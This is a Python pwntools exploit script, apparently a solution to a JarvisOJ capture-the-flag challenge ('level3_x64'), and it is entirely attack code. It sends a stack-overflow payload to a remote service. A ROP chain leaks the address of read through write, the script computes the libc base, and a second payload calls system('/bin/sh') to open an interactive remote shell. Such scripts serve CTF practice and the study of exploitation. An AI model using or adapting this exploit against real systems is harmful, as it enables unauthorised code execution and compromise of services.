from pwn import *

#context.log_level = 'debug'

#n = process('./level3_x64')
n = remote('pwn2.jarvisoj.com', 9883)
#n = remote("localhost",12345)

elf = ELF('./level3_x64')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.19.so')

offset = 0x88

read_got = elf.got['read']
write_plt = elf.plt['write']
vuln_addr = elf.symbols['vulnerable_function']

pop_rdi_ret_addr = 0x00000000004006b3
pop_rsi_pop_r15_ret_addr = 0x00000000004006b1

payload1 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_pop_r15_ret_addr) +  p64(read_got) + p64(1) + p64(write_plt) + p64(vuln_addr)

n.recvuntil("Input:\n")
n.sendline(payload1)

read_addr = u64(n.recv(8))

libcbase = read_addr - libc.symbols['read']

sys_addr = libcbase + libc.symbols['system']
sh_addr = libcbase + libc.search("/bin/sh").next()

n.recvuntil('Input:\n')
payload2 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(sh_addr) + p64(sys_addr)
n.sendline(payload2)
n.interactive()
